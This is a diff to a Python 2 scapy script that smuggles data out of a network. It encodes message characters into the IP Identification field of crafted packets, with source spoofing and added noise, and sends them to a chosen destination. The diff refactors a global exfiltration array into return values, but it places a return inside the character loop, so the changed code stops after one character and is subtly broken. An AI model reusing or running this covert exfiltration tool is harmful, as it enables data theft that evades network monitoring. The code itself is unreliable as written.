@@ -11,12 +11,11 @@ from scapy.all import *
 
 
 
-def add_n0ise_ipid(i):
+def add_n0ise_ipid(packet_sequence, pkt):
     print '[*] adding n0ise to IPID..'
-    y = exfilArray[i]
     # Add some randomness
     randy = random.randint(-999, 999)  # too large will produce error
-    pkt.seq = y + randy
+    pkt.seq = packet_sequence + randy
     # Signal noisy packet
     pkt.window = int(8182) - random.randint(23, 275)
     try:
@@ -30,6 +29,7 @@ def add_n0ise_ipid(i):
 # Lots of options here but we're going to convert each letter of the message
 # to its decimal equivalent.. which will be multiplied by the multiplier(?).
 def convert_ipid(message):
+    retval = []
     print '[*] converting ipid message: %s' % message
     for char in message:
         c = ord(char)
@@ -44,13 +44,14 @@ def convert_ipid(message):
             print '[-] Warning: IPID int too large %d. Setting to X' % exfilChar
             # TODO: recover safely, setting to X for now
             exfilChar = ord(X) * 256
-        exfilArray.append(exfilChar)
+        retval.append(exfilChar)
         print '%s=%d, exfilChar=%d' % (char, c, exfilChar)
+        return retval
 
 # In IPv4, the Identification (ID) field is a 16-bit value.
 # TODO: validate value of ipid (must be a 16-bit value)
 def exfil_ipid(spoof, destination, dstport, message):
-    convert_ipid(message)
+    exfilArray = convert_ipid(message)
     msglen = len(exfilArray)
     print '[*] Attempting ID identification exfil..msglen', msglen
     # reset our packet
@@ -60,7 +61,7 @@ def exfil_ipid(spoof, destination, dstport, message):
         print '[*] count i:', i
         if i == msglen:
             print '[*] EOM'
-        add_n0ise_ipid(i)
+        add_n0ise_ipid(exfilArray[i], pkt)
         pkt.id = exfilArray[i]
         pkt.window = 1338
         time.sleep(0.4)
